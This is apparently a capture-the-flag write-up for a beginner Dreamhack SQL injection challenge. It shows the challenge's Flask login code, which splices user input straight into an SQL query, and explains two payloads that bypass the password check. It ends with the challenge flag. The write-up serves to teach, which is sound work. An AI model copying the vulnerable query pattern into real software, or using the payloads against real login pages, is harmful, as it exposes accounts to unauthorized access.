---
title: simple_sqli
author: thanguyen165
date: 2023-01-01 07:00:00 +0700
categories: [Practice, dreamhack]
tags: [Web Exploitation, SQL injection]
---

* Level: 1
* Link: [https://dreamhack.io/wargame/challenges/24/](https://dreamhack.io/wargame/challenges/24/)

## Description
>
> This is a login service.
>
> Obtain the flag through the SQL INJECTION vulnerability. The flags are in the ```flag.txt```, ```FLAG``` variable.

### Attached

```python
#!/usr/bin/python3
from flask import Flask, request, render_template, g
import sqlite3
import os
import binascii

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

DATABASE = "database.db"
if os.path.exists(DATABASE) == False:
    db = sqlite3.connect(DATABASE)
    db.execute('create table users(userid char(100), userpassword char(100));')
    db.execute(f'insert into users(userid, userpassword) values ("guest", "guest"), ("admin", "{binascii.hexlify(os.urandom(16)).decode("utf8")}");')
    db.commit()
    db.close()

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
    db.row_factory = sqlite3.Row
    return db

def query_db(query, one=True):
    cur = get_db().execute(query)
    rv = cur.fetchall()
    cur.close()
    return (rv[0] if rv else None) if one else rv

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    else:
        userid = request.form.get('userid')
        userpassword = request.form.get('userpassword')
        res = query_db(f'select * from users where userid="{userid}" and userpassword="{userpassword}"')
        if res:
            userid = res[0]
            if userid == 'admin':
                return f'hello {userid} flag is {FLAG}'
            return f'<script>alert("hello {userid}");history.go(-1);</script>'
        return '<script>alert("wrong");history.go(-1);</script>'

app.run(host='0.0.0.0', port=8000)

```

## Analyzation

Let's check the login function

```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    else:
        userid = request.form.get('userid')
        userpassword = request.form.get('userpassword')
        res = query_db(f'select * from users where userid="{userid}" and userpassword="{userpassword}"')
        if res:
            userid = res[0]
            if userid == 'admin':
                return f'hello {userid} flag is {FLAG}'
            return f'<script>alert("hello {userid}");history.go(-1);</script>'
        return '<script>alert("wrong");history.go(-1);</script>'
```

If we make input to ```userid```
```
admin" or "1
```

Then the query will be
```sql
select * from users where userid="admin" or "1" and userpassword="{userpassword}"
```

In SQL, ```and``` has precedence over ```or``` (check [stackoverflow.com](https://stackoverflow.com/questions/1241142/sql-logic-operator-precedence-and-and-or)). So the password condition shall be bypassed.

Another way: giving the ```userid```
```
admin" --
```

Then the query will be
```sql
select * from users where userid="admin" -- and userpassword="{userpassword}"
```

The password condition is disabled since it has been changed to comment (check [w3schools.com](https://www.w3schools.com/Sql/sql_comments.asp)).

## Solution

Input for ```userid```
```
admin" or "1
```
or
```
admin" --
```
and random password, the flag will show up

The flag is
```
DH{c1126c8d35d8deaa39c5dd6fc8855ed0}
```

## Summarization

[SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)